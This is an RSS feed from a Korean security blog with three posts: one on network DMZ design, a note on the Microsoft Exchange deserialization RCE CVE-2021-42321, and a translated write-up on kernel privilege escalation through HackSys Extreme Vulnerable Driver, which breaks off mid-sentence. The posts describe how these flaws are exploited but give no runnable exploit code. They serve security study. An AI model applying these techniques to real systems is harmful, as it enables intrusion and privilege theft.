<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 01 Dec 2021 05:02:56 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[해키피디아] Network DMZ</title>
      <link>https://hackyboiz.github.io/2021/12/01/y00n_nms/dmz/</link>
      <guid>https://hackyboiz.github.io/2021/12/01/y00n_nms/dmz/</guid>
      <pubDate>Wed, 01 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;DMZ(Demilitarized Zone) &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C;&amp;#xB294; &amp;#xC870;&amp;#xC9C1;&amp;#xC758; &amp;#xB0B4;&amp;#xBD80; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06</description>
        
      
      
      
      <content:encoded><![CDATA[<p>DMZ(Demilitarized Zone) &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB294; &#xC870;&#xC9C1;&#xC758; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC640; &#xC678;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC911;&#xAC04;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xC5EC; &#xC870;&#xC9C1;&#xC774; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xBCF4;&#xD638;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. &#xC870;&#xC9C1;&#xC774; &#xC778;&#xD130;&#xB137;&#xACFC; &#xAC19;&#xC740; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB300;&#xD55C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC640; LAN(Local Area Network)&#xC744; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC720;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC678;&#xBD80;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; DNS(Domain Name System), FTP(File Transfer Protocol), &#xBA54;&#xC77C;, &#xD504;&#xB85D;&#xC2DC;, VoIP(Voice over Internet Protol) &#xBC0F; &#xC6F9; &#xC11C;&#xBC84;, &#xC678;&#xBD80; &#xC11C;&#xBE44;&#xC2A4; &#xBC0F; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>DMZ&#xB294; &#xC774;&#xB97C; &#xC704;&#xD574; &#xB2E8;&#xC77C; &#xBC29;&#xD654;&#xBCBD; &#xB610;&#xB294; &#xC774;&#xC911; &#xBC29;&#xD654;&#xBCBD;&#xC73C;&#xB85C; &#xC124;&#xACC4;&#xB418;&#xC9C0;&#xB9CC; &#xD604;&#xC7AC;&#xB294; &#xC774;&#xC911; &#xBC29;&#xD654;&#xBCBD; &#xBC29;&#xC2DD;&#xC744; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBCF4;&#xD1B5; &#xCCAB; &#xBC88;&#xC9F8; &#xBC29;&#xD654;&#xBCBD;&#xC740; DMZ&#xC5D0; &#xB300;&#xD55C; &#xC678;&#xBD80; &#xD2B8;&#xB798;&#xD53D;&#xB9CC; &#xD5C8;&#xC6A9;&#xD558;&#xACE0;, &#xB450; &#xBC88;&#xC9F8; &#xBC29;&#xD654;&#xBCBD;&#xC740; DMZ&#xC5D0;&#xC11C; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB85C; &#xAC00;&#xB294; &#xD2B8;&#xB798;&#xD53D;&#xB9CC; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAC8C; &#xB418;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC870;&#xC9C1;&#xC758; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB450; &#xBC29;&#xD654;&#xBCBD;&#xC744; &#xBAA8;&#xB450; &#xD1B5;&#xACFC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC911;&#xC694;&#xD55C; &#xC810;&#xC740; &#xC870;&#xC9C1;&#xC758; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130; &#xBC0F; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB300;&#xD55C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xC5EC; &#xACE0;&#xAE09; &#xBCF4;&#xC548; &#xACC4;&#xCE35;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCF4;&#xC548; &#xC774;&#xC810;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC561;&#xC138;&#xC2A4; &#xC81C;&#xC5B4; &#xD65C;&#xC131;&#xD654;: &#xAE30;&#xC5C5;&#xC740; &#xC678;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. DMZ&#xB294; &#xB0B4;&#xBD80; &#xD2B8;&#xB798;&#xD53D; &#xD750;&#xB984;&#xC744; &#xC911;&#xC559; &#xC9D1;&#xC911;&#xD654;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xD2B8;&#xB798;&#xD53D;&#xC758; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xBC0F; &#xAE30;&#xB85D;&#xC744; &#xB2E8;&#xC21C;&#xD654;&#xD558;&#xB294; &#xD504;&#xB85D;&#xC2DC; &#xC11C;&#xBC84;&#xB3C4; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC815;&#xD0D0;(network reconnaissance) &#xBC29;&#xC9C0;: &#xC778;&#xD130;&#xB137;&#xACFC; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC0AC;&#xC774;&#xC5D0; &#xC874;&#xC7AC;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4; &#xC218;&#xC9D1;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. DMZ &#xB0B4;&#xC758; &#xC11C;&#xBC84;&#xB294; &#xACF5;&#xAC1C;&#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xBCFC; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xBC29;&#xD654;&#xBCBD;&#xC5D0; &#xC758;&#xD574; &#xB2E4;&#xB978; &#xBCF4;&#xC548; &#xACC4;&#xCE35;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. DMZ&#xAC00; &#xD6FC;&#xC190;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xB0B4;&#xBD80; &#xBC29;&#xD654;&#xBCBD;&#xC740; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC640; DMZ&#xB97C; &#xBD84;&#xB9AC;&#xD574; &#xBCF4;&#xC548;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xACE0; &#xC815;&#xD0D0;&#xC744; &#xC5B4;&#xB835;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC778;&#xD130;&#xB137; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;(IP) &#xC2A4;&#xD478;&#xD551; &#xCC28;&#xB2E8;: &#xACF5;&#xACA9;&#xC790;&#xB294; IP &#xC8FC;&#xC18C;&#xB97C; &#xC2A4;&#xD478;&#xD551;&#xD558;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC2B9;&#xC778;&#xB41C; &#xC7A5;&#xCE58;&#xB97C; &#xAC00;&#xC7A5;&#xD558;&#xC5EC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xB824;&#xACE0; &#xD560; &#xB54C;, DMZ&#xB294; &#xC2A4;&#xD478;&#xD551; &#xC2DC;&#xB3C4;&#xB97C; &#xBC1C;&#xACAC;&#xD558;&#xACE0; &#xCC28;&#xB2E8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/network/">network</category>
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/dmz/">dmz</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/01/y00n_nms/dmz/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021–42321: Some notes about Microsoft Exchange Deserialization RCE</title>
      <link>https://hackyboiz.github.io/2021/11/30/fabu1ous/2021-11-30/</link>
      <guid>https://hackyboiz.github.io/2021/11/30/fabu1ous/2021-11-30/</guid>
      <pubDate>Tue, 30 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://peterjson.medium.com/some-notes-about-microsoft-e</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852">Some notes about Microsoft Exchange Deserialization RCE (CVE-2021&#x2013;42321)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft Exchange Server 2016 CU 21,22</p><p>Microsoft Exchange Server 2019 CU 10,11</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft Exchange Server&#xC5D0;&#xC11C; deserialization&#xC5D0; &#xC758;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>serialization&#xACFC; deserialization &#xC791;&#xC5C5;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; type&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xAE30; &#xC704;&#xD574; <code>SerializationBinder</code>&#xAC12;&#xC774; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xAC12;&#xC774; <code>ExchangeBinaryFormatterFactory</code>&#xC5D0; &#xC81C;&#xB300;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>SerializationBinder</code>&#xAC12;&#xC774; <code>ExchangeBinaryFormatterFactory.CreateBinaryFormatter()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xBA74; deserialization&#xC758; type&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xAE30; &#xC704;&#xD574; <code>ChainedSerializationBinder</code> &#xAC12;&#xC744; &#xB300;&#xC2E0; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. <code>ChainedSerializationBinder</code> &#xAC12;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCD08;&#xAE30;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>strictMode = false</li><li>allow = System.DelegateSerializationHolder</li><li>allowedGenerics = null</li></ul><p><img src="/2021/11/30/fabu1ous/2021-11-30/1.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; <code>ChainedSerializationBinder.ValidateTypeToDeserialize()</code>&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C; <code>BlockedDeserializationException</code>&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; catch&#xBB38;&#xC5D0;&#xC11C; flag&#xAC12;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xACE0; <code>True</code>&#xC77C; &#xB54C;&#xB9CC; &#xB2E4;&#xC2DC; throw&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xD574;&#xB2F9; flag &#xAC12;&#xC774;  <code>ChainedSerializationBinder</code> &#xC5D0;&#xC11C; &#xC804;&#xB2EC; &#xBC1B;&#xC740; strictMode&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD56D;&#xC0C1; <code>False</code>&#xC774;&#xACE0; &#xC608;&#xC678;&#xCC98;&#xB9AC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/exchange/">exchange</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/30/fabu1ous/2021-11-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] HackSys Extreme Vulnerable Driver — Arbitrary Write NULL (New Solution)</title>
      <link>https://hackyboiz.github.io/2021/11/28/fabu1ous/write-null/</link>
      <guid>https://hackyboiz.github.io/2021/11/28/fabu1ous/write-null/</guid>
      <pubDate>Sun, 28 Nov 2021 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p&gt;&amp;#x201C;Arbitrary Write NULL&amp;#x201D; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC5D0; &amp;#x201C;NtQuerySystemInformation&amp;#x201D;&amp;#xC744; &amp;#xD6</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>&#x201C;Arbitrary Write NULL&#x201D; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#x201C;NtQuerySystemInformation&#x201D;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xC624;&#xB298;&#xC740; &#x201C;HEVD-(Hacksys Extreme Vulnerable Driver)&#x201D;&#xB97C; &#xD1B5;&#xD574; &#x201C;LPE - (Local Privilege Escalation : &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;)&#xC744; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#x201C;NtQuerySystemInformation&#x201D; &#xC2DC;&#xC2A4;&#xD15C;&#xCF5C; &#xACF5;&#xACA9; &#xAE30;&#xC220;&#xC744; &#xC2EC;&#xB3C4; &#xC788;&#xAC8C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xD754;&#xD788; &#xB4F1;&#xC7A5;&#xD558;&#xB294; &#x201C;Arbitrary Write NULL&#x201D;(&#xC784;&#xC758; NULL &#xC4F0;&#xAE30;) &#xCDE8;&#xC57D;&#xC810;&#xC744; exploit&#xD558;&#xB294; &#xAC00;&#xB2A5;&#xC131; &#xBC0F; &#xAE30;&#xB2A5;&#xC801; &#xBC29;&#xBC95;&#xB860;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, &#x201C;HEVD IOCTL&#x201D; &#xD1B5;&#xC2E0;&#xC744; &#xC704;&#xD55C; &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45; &#xD658;&#xACBD; &#xC124;&#xC815; &#xBC0F; &#xC124;&#xCE58; &#xACFC;&#xC815;&#xC740; &#xC0DD;&#xB7B5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; write-up&#xC740; &#xCD5C;&#xC885; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xB978; &#xC0AC;&#xB78C;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC558;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xC81C;&#xAC00; &#xC5B4;&#xB5A4; &#xB178;&#xB825;&#xC744; &#xD588;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;. &#xC7AC;&#xBC0C;&#xAC8C; &#xC77D;&#xC5B4;&#xC8FC;&#xC138;&#xC694;! =)</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC6B0;&#xC120;, &#x201C;Arbitrary Write NULL&#x201D;&#xC774; &#xBB54;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xC774;&#xC57C;&#xAE30;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xAC04;&#xB2E8;&#xD55C; &#x201C;cmd.exe&#x201D;&#xC758; &#x201C;ring3 (user-land)&#x201D; &#xC138;&#xC158;&#xC73C;&#xB85C; &#xBD80;&#xD130; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xCEE4;&#xB110;&#xC758; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#x201C;LPE&#x201D;&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5B4;&#xB5A4; &#xD589;&#xC704;&#xAC00; &#xAC00;&#xB2A5;&#xD560;&#xAE4C;&#xC694;?</p><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C;, &#x201C;Arbitrary Write NULL&#x201D;&#xC740; &#x201C;Arbitrary Write&#x201D; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xB9E4;&#xC6B0; &#xC720;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xCC28;&#xC774;&#xC810;&#xC774; &#xC788;&#xB2E4;&#xBA74;, &#xC804;&#xC790;&#xB294; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;/&#xD3EC;&#xC778;&#xD130;&#xC5D0; &#x201C;write&#x2192;[0x00000000]&#x201D; &#xB3D9;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0;, &#xD6C4;&#xC790;&#xB294; &#x201C;Write-What-Where&#x201D;&#xB77C;&#xACE0; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989; &#x201C;write &#x2192; [0xdeadbeef]&#x201D;&#xC640; &#xAC19;&#xC740; &#xD589;&#xC704;&#xAC00; &#xAC00;&#xB2A5;&#xD574; &#x201C;0x00000000&#x201D; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;/&#xD3EC;&#xC778;&#xD130;&#xC758; &#xAC12;&#xC744; &#x201C;0xdeadbeef&#x201D;&#xB85C; overflow&#xD558;&#xACE0; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; HEVD &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xD574;&#xBD80;&#xD558;&#xACE0; &#xBB34;&#xC2A8;&#xC77C;&#xC774; &#xC77C;&#xC5B4;&#xB098;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="HEVD-TriggerWriteNull"><a href="#HEVD-TriggerWriteNull" class="headerlink" title="[HEVD]-TriggerWriteNull"></a>[HEVD]-TriggerWriteNull</h1><p><img src="/2021/11/28/fabu1ous/write-null/1.png" alt></p><p>HEVD - <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a></p><p><img src="/2021/11/28/fabu1ous/write-null/2.png" alt></p><p><code>TriggerWriteNULL</code>&#xB294; kernel user-buffer&#xB97C; &#xD578;&#xB4E4;&#xD558;&#xACE0; ring3(user-land)&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/3.png" alt></p><p>&#x201C;ifdef SECURE&#x201D; (&#xBB3C;&#xB860; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;)&#xB97C; &#xBCF4;&#xC2DC;&#xBA74;, &#x201C;probeForWrite()&#x201D; &#xD568;&#xC218;&#xB294; user input buffer&#xAC00; &#x201C;ring3&#x201D;&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xAC8C; &#xC544;&#xB2C8;&#xB77C;&#xBA74; &#xC801;&#xC808;&#xD55C; &#xBCF4;&#xC548; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xB97C; NULL&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/4.png" alt></p><p>&#xC8FC;&#xC11D;&#xC5D0; &#xC4F0;&#xC5EC;&#xC788;&#xB4DC;&#xC2DC; &#x201C;#ifdef SUCURE&#x201D; bit set&#xC774; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xB418;&#xBA74; &#x201C;[edi]&#x201D; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#x201C;[ebx]&#x201D;&#xC5D0; &#xC758;&#xD574; &#x201C;0x00000000&#x201D;&#xC73C;&#xB85C; overflow&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/5.png" alt></p><p>IOCTL drive &#xC5F0;&#xACB0;&#xC740; &#xBBF8;&#xB9AC; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; , &#xCCAB; user-buffer&#xC758; &#xCCAB; 4 byte &#x201C;(shellcode_ptr)&#x201D;&#xC5D0; &#xB300;&#xD574; &#xD14C;&#xC2A4;&#xD2B8; &#xD574;&#xBCF4;&#xACE0; &#x201C;0x00000000&#x201D;&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/6.png" alt></p><p>&#xC801;&#xC808;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; break point&#xB97C; &#xAC78;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/7.png" alt></p><p>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACE0; break point&#xC5D0; &#xAC78;&#xB9AC;&#xBA74; &#x201C;[edi]&#x201D;&#xAC00; user-buffer&#xC758; &#xC8FC;&#xC18C; &#x201C;(shellcode_ptr &#x2192; 0x00500000)&#x201D;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/8.png" alt></p><p>&#x201C;shellcode&#x201D;&#xB294; &#x201C;LPE&#x201D;&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xB294; &#x201C;x86 &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#x201D; &#xCF54;&#xB4DC;&#xAC00; &#xB2F4;&#xACA8;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCCAB; &#x201C;4 bytes&#x201D;&#xC5D0;&#xB294; &#xC800;&#xD76C; &#x201C;shellcode&#x201D;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC774; &#xB2F4;&#xACA8; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC774; &#xC0AC;&#xC2E4;&#xC740; &#xBB34;&#xC2DC;&#xD558;&#xACE0; &#x201C;0xa16460cc&#x201D; &#xC8FC;&#xC18C;&#xB97C; &#xC8FC;&#xBAA9;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/9.png" alt></p><p>&#xC774; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ebx=0x00000000&#xAC00; &#xC800;&#xD76C; user-buffer eax=0xa16460cc&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xB36E;&#xC5B4;&#xC4F0;&#xC5EC; &#xC9C0;&#xACE0; &#xC788;&#xB294; &#xAC8C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C;&#xC758; &#xBB38;&#xC81C;&#xB294; &#xBD84;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C; &#xC0AC;&#xC6A9;&#xC790; &#x201C;(ring3)&#x201D;&#xB85C;&#xC11C; &#xC544;&#xBB34; 